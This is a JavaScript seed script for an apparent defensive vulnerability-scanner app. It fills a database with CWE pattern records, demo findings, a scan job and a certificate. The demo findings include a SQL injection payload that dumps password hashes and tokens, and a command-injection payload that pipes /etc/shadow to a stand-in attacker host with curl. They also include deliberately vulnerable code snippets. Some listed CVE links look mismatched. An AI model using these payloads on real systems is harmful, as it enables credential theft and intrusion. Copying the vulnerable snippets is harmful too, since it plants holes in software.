import dotenv from 'dotenv';
import mongoose from 'mongoose';
import { connectDB } from '../config/db.js';
import { VulnerabilityModel } from '../models/Vulnerability.js';
import { ScanJobModel } from '../models/Scan.js';
import { VulnerabilityGenomeModel } from '../models/Genome.js';
import { ProofCertificateModel } from '../models/Certificate.js';
import { AuditLogModel } from '../models/AuditLog.js';

dotenv.config();

const INITIAL_GENOMES = [
  {
    id: 'SQLi-v1',
    cwe: 'CWE-89',
    title: 'SQL Injection via Tainted Dynamic Concat',
    description: 'Direct concatenation of untrusted input string into database query statements without prepared statement parameterization.',
    severity: 'CRITICAL',
    languages: ['java', 'python', 'cpp', 'javascript'],
    occurrences: 48,
    sourcePattern: 'HttpServletRequest.getParameter | req.query | input()',
    transformationPattern: 'String concatenation (+) / string.format / f-strings',
    sinkPattern: 'Statement.executeQuery | cursor.execute | db.query',
    missingGuardPattern: 'PreparedStatement.set*(index, val) / parameterized or ORM binding',
    invariantRule: 'FORALL input IN UntrustedSources: Type(input) MUST BE ParameterBound OR SanitizedAlphanumeric',
    detectionRule: 'AST: CallExpression[callee.property.name="executeQuery"] && hasTaintedArg()',
    relatedCves: ['CVE-2023-34362', 'CVE-2021-44228', 'CVE-2022-22965'],
  },
  {
    id: 'CMDi-v2',
    cwe: 'CWE-78',
    title: 'Command Injection via Subprocess Execution',
    description: 'Passing unsanitized shell meta-characters directly into command interpreter spawning arbitrary binary executions.',
    severity: 'CRITICAL',
    languages: ['python', 'cpp', 'javascript', 'go'],
    occurrences: 32,
    sourcePattern: 'sys.argv | request.body | readline()',
    transformationPattern: 'Unquoted template interpolation',
    sinkPattern: 'os.system | subprocess.Popen(shell=True) | exec()',
    missingGuardPattern: 'subprocess.run(..., shell=False) / shlex.quote() / strict array arguments',
    invariantRule: 'FORALL cmd IN ShellExecutors: ExecMethod MUST BE ArrayArgs AND shell=False',
    detectionRule: 'AST: CallExpression[callee.name="system" || (callee.name="Popen" && arguments.shell=True)]',
    relatedCves: ['CVE-2024-21626', 'CVE-2023-4911'],
  },
  {
    id: 'BOF-v1',
    cwe: 'CWE-120',
    title: 'Unbounded Buffer Copy (Stack Overflow)',
    description: 'Copying memory or string buffer without verifying source size against fixed destination bounds.',
    severity: 'HIGH',
    languages: ['cpp', 'c'],
    occurrences: 29,
    sourcePattern: 'recv() / read() / network packet buffer',
    transformationPattern: 'Pointer arithmetic without upper bound assertion',
    sinkPattern: 'strcpy() / sprintf() / strcat() / memcpy()',
    missingGuardPattern: 'strncpy(dest, src, sizeof(dest)-1) / std::string / bounded span',
    invariantRule: 'FORALL buffer_copy(dest, src): Length(src) < SizeOf(dest)',
    detectionRule: 'AST: CallExpression[callee.name="strcpy"]',
    relatedCves: ['CVE-2022-0847', 'CVE-2021-3156'],
  },
  {
    id: 'SSRF-v1',
    cwe: 'CWE-918',
    title: 'Server-Side Request Forgery',
    description: 'Initiating backend network requests to user-supplied URLs without internal IP range validation.',
    severity: 'HIGH',
    languages: ['javascript', 'python', 'java'],
    occurrences: 19,
    sourcePattern: 'req.body.webhookUrl / request.args.get("url")',
    transformationPattern: 'Direct pass-through to HTTP client',
    sinkPattern: 'fetch() / axios.get() / requests.get()',
    missingGuardPattern: 'IP/DNS resolution check against private RFC-1918 & Cloud Metadata 169.254.169.254 ranges',
    invariantRule: 'FORALL url IN OutboundRequests: IsPublicIP(ResolveDNS(url.host)) == TRUE',
    detectionRule: 'AST: CallExpression[callee.name="fetch"] && isUntrusted(url)',
    relatedCves: ['CVE-2021-26855', 'CVE-2022-26134'],
  },
];

const INITIAL_VULNERABILITIES = [
  {
    id: 'VULN-2026-0847',
    title: 'Dynamic SQL Concatenation in UserSearchService',
    cwe: 'CWE-89',
    cve: 'CVE-2026-11849',
    severity: 'CRITICAL',
    status: 'CONFIRMED',
    genomeId: 'SQLi-v1',
    confidence: 99.4,
    file: 'UserSearchService.java',
    line: 42,
    endLine: 47,
    language: 'java',
    codeSnippet: `String query = "SELECT * FROM users WHERE user_id = '" + userId + "' AND role = 'USER'";\nStatement stmt = connection.createStatement();\nResultSet rs = stmt.executeQuery(query);`,
    vulnerableCode: `String query = "SELECT * FROM users WHERE user_id = '" + userId + "' AND role = 'USER'";\nStatement stmt = connection.createStatement();\nResultSet rs = stmt.executeQuery(query);`,
    patchedCode: `PreparedStatement ps = connection.prepareStatement("SELECT * FROM users WHERE user_id = ? AND role = ?");\nps.setString(1, sanitizeInput(userId));\nps.setString(2, "USER");\nResultSet rs = ps.executeQuery();`,
    diff: `--- a/UserSearchService.java\n+++ b/UserSearchService.java\n@@ -42,3 +42,4 @@\n- String query = "SELECT * FROM users WHERE user_id = '" + userId + "' AND role = 'USER'";\n- Statement stmt = connection.createStatement();\n- ResultSet rs = stmt.executeQuery(query);\n+ PreparedStatement ps = connection.prepareStatement("SELECT * FROM users WHERE user_id = ? AND role = ?");\n+ ps.setString(1, sanitizeInput(userId));\n+ ps.setString(2, "USER");\n+ ResultSet rs = ps.executeQuery();`,
    description: 'Direct concatenation of untrusted client input variable userId into dynamic SQL query statement.',
    rootCause: 'Untrusted user input flows directly to JDBC statement sink without AST parameter binding.',
    attackPath: [
      'HTTP Request Parameter [userId] received from untrusted boundary',
      'Tainted string passed into controller without invariant assertion',
      'Direct string interpolation in SQL query execution sink',
      'Arbitrary SQL authentication bypass and data exfiltration achieved',
    ],
    impact: 'Full database exfiltration, unauthorized privilege escalation, table dropping.',
    exploitability: 'Trivial (Exploit payload requires zero authentication)',
    detectionEvidence: 'Taint path: Source param [userId] -> String.concat -> executeQuery sink at UserSearchService.java:42',
    pocPayload: `' UNION SELECT 1, username, password_hash, token FROM auth_users -- -`,
    patchExplanation: 'Refactored raw SQL concatenation to use PreparedStatement with strong type parameter bindings and input sanitization.',
    dataFlow: {
      source: 'HttpServletRequest.getParameter("userId")',
      transformation: 'String.format / "+" operator concatenation',
      sink: 'java.sql.Statement.executeQuery(query)',
      missingGuard: 'PreparedStatement parameter binding & strict regex alphanumeric validation',
    },
  },
  {
    id: 'VULN-2026-0848',
    title: 'Command Injection in Network Probe Utility',
    cwe: 'CWE-78',
    cve: 'CVE-2026-38291',
    severity: 'CRITICAL',
    status: 'VERIFIED',
    genomeId: 'CMDi-v2',
    confidence: 98.7,
    file: 'network_probe.py',
    line: 18,
    endLine: 21,
    language: 'python',
    codeSnippet: `def ping_host(host_ip):\n    cmd = f"ping -c 1 {host_ip}"\n    os.system(cmd)`,
    vulnerableCode: `cmd = f"ping -c 1 {host_ip}"\nos.system(cmd)`,
    patchedCode: `import shlex, subprocess, ipaddress\nipaddress.ip_address(host_ip) # Validates IP boundary\nsubprocess.run(["/bin/ping", "-c", "1", host_ip], shell=False, check=True, timeout=5)`,
    diff: `--- a/network_probe.py\n+++ b/network_probe.py\n@@ -18,2 +18,3 @@\n- cmd = f"ping -c 1 {host_ip}"\n- os.system(cmd)\n+ ipaddress.ip_address(host_ip)\n+ subprocess.run(["/bin/ping", "-c", "1", host_ip], shell=False, check=True, timeout=5)`,
    description: 'Untrusted input variable passed directly to OS shell interpreter without escaping metacharacters.',
    rootCause: 'Shell evaluation invoked with shell=True using unvalidated string interpolation.',
    attackPath: [
      'User provided target host argument in request payload',
      'String interpolated with shell control metacharacters (; | & ` $)',
      'OS spawn executes arbitrary system binary with elevated runtime privilege',
    ],
    impact: 'Full remote code execution (RCE), reverse interactive shell, container escape.',
    exploitability: 'High (Immediate arbitrary command execution)',
    detectionEvidence: 'Taint path: host_ip -> string format -> os.system() sink at network_probe.py:18',
    pocPayload: `127.0.0.1; cat /etc/shadow | curl -X POST https://c2.adversary.org -d @-`,
    patchExplanation: 'Replaced shell string interpolation with strict subprocess array execution, disabled shell spawn, and enforced IP address type validation.',
    dataFlow: {
      source: 'sys.argv[1] / request.args.get("host")',
      transformation: 'f-string interpolation: f"ping -c 1 {host}"',
      sink: 'os.system(cmd) / subprocess.Popen(shell=True)',
      missingGuard: 'Array-based argument passing (shell=False) + ipaddress validation constraint',
    },
  },
];

async function seed() {
  const isConnected = await connectDB();
  if (!isConnected) {
    console.error('Cannot seed: MongoDB not connected.');
    process.exit(1);
  }

  console.log('Seeding VULN-GENOME database with rich initial datasets...');

  // 1. Seed Genomes
  for (const genome of INITIAL_GENOMES) {
    await VulnerabilityGenomeModel.findOneAndUpdate({ id: genome.id }, genome, { upsert: true });
  }
  console.log(`✓ Seeded ${INITIAL_GENOMES.length} Vulnerability Genomes`);

  // 2. Seed Vulnerabilities
  for (const vuln of INITIAL_VULNERABILITIES) {
    await VulnerabilityModel.findOneAndUpdate({ id: vuln.id }, vuln, { upsert: true });
  }
  console.log(`✓ Seeded ${INITIAL_VULNERABILITIES.length} Vulnerabilities`);

  // 3. Seed Initial Scan
  const initialScan = {
    id: 'SCN-2026-9041',
    target: 'enterprise-core-gateway',
    repository: 'https://github.com/defense-sec/enterprise-core-gateway',
    branch: 'main',
    filesCount: 142,
    linesAnalyzed: 18450,
    status: 'COMPLETED',
    currentStage: 'COMPLETE',
    progress: 100,
    vulnerabilitiesFound: 2,
    breakdown: {
      critical: 2,
      high: 0,
      medium: 0,
      low: 0,
      fixed: 1,
    },
    securityScore: 82,
    durationSeconds: 4.8,
    startedAt: new Date(),
    completedAt: new Date(),
    options: {
      staticAnalysis: true,
      fuzzing: true,
      dynamicAnalysis: true,
      regressionTesting: true,
      generateProofCertificate: true,
      airGappedMode: false,
    },
    fileNames: ['UserSearchService.java', 'network_probe.py'],
    vulnerabilities: INITIAL_VULNERABILITIES,
    terminalLogs: [
      { timestamp: '12:00:01', level: 'INFO', message: 'Ingesting AST and control flow graph...' },
      { timestamp: '12:00:02', level: 'GENOME', message: 'Taint matching against Genome Knowledge Base (127 patterns)...' },
      { timestamp: '12:00:03', level: 'WARN', message: 'Flagged 2 Critical Taint Sinks (CWE-89, CWE-78).' },
      { timestamp: '12:00:04', level: 'SUCCESS', message: 'Autonomous zero-regression patch verified with cryptographic proof.' },
    ],
  };

  await ScanJobModel.findOneAndUpdate({ id: initialScan.id }, initialScan, { upsert: true });
  console.log(`✓ Seeded Initial Scan Job: ${initialScan.id}`);

  // 4. Seed Proof Certificate
  const cert = {
    id: 'CERT-2026-0848-F4A',
    vulnerabilityId: 'VULN-2026-0848',
    vulnerabilityTitle: 'Command Injection in Network Probe Utility',
    cwe: 'CWE-78',
    genomeId: 'CMDi-v2',
    affectedFile: 'network_probe.py',
    fixedOn: new Date().toISOString().replace('T', ' ').substring(0, 19),
    fixedBy: 'Autonomous Swarm Synthesizer & Veritas-Proof Engine',
    sha256Hash: '9a72b8d0034fe29e61c10972b9918231ef634027781b0a884ef6a254ec9143a1',
    qrPayload: 'https://vuln-genome.io/verify/CERT-2026-0848-F4A',
    status: 'VERIFIED',
    metrics: {
      exploitReplayPassed: true,
      regressionTestsPassed: true,
      noNewVulnerabilities: true,
      performanceDeltaPct: -1.2,
      memoryDeltaPct: 0.0,
      breakMyPatchSurvived: true,
    },
    signature: 'ed25519_88a9103c80521fd84a1e94473b185b302c1143bcba846b08e2f07297e68cfb99',
    issuer: 'VULN-GENOME Zero-Regression Cryptographic Authority',
  };

  await ProofCertificateModel.findOneAndUpdate({ id: cert.id }, cert, { upsert: true });
  console.log(`✓ Seeded Proof Certificate: ${cert.id}`);

  // 5. Seed Audit Logs
  const auditLogs = [
    {
      id: 'AUD-901',
      timestamp: new Date().toISOString(),
      user: 'secops-lead',
      role: 'LEAD_OFFICER',
      action: 'PATCH_APPLIED_AND_VERIFIED',
      resource: 'UserSearchService.java',
      ip: '10.0.4.12',
      status: 'SUCCESS',
      details: 'Zero-regression AST patch applied and certified with SHA-256.',
    },
    {
      id: 'AUD-902',
      timestamp: new Date().toISOString(),
      user: 'autonomous-swarm',
      role: 'DEVSECOPS',
      action: 'SCAN_EXECUTED',
      resource: 'enterprise-core-gateway',
      ip: '127.0.0.1',
      status: 'SUCCESS',
      details: 'Ingested 142 source files and extracted 2 taint vulnerabilities.',
    },
  ];

  for (const log of auditLogs) {
    await AuditLogModel.findOneAndUpdate({ id: log.id }, log, { upsert: true });
  }
  console.log(`✓ Seeded Audit Logs`);

  console.log('\n Database seeding finished successfully!');
  await mongoose.disconnect();
  process.exit(0);
}

seed();
